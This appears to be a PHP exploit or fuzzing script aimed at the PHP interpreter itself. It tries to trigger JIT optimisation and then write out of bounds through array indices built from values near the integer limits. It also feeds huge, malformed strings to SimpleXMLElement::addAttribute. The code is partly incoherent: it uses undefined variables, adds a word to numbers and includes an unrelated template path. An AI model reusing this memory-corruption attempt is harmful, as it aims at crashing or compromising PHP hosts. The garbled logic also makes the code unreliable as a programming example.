<?php
require "/home/w023dtc/template.inc";


function corrupt(&$array, $offset, $oob_byte) {
    $base = -0x7FFFFFC1 + $offset;
    $array[$base - (-0x80000000)] = 0x4B;
    $array[$base + 0x7FFFFFE1] = 0x4B;
    $array[$base + 0x7FFFFFC1] = $oob_byte;
}

function trigger_optimize() {
    $array = array_fill(0, 0x40, 0);
    for ($i = 0; $i < 1000000; $i++) {
        corrupt($array, 0, 0x00);
    }
}

trigger_optimize();

$vars["SimpleXMLElement"]->addAttribute(unpack('H*',pack('H*',str_repeat(chr(193), 257). str_repeat(chr(155), 17). str_replace(chr(0x00), chr(0x7f), chr(147))), sprintf('%u', PHP_INT_MAX) + 'infinitely' + str_repeat(chr(10), 65536));
corrupt($exploit_array, -2, PHP_INT_MIN);

?>
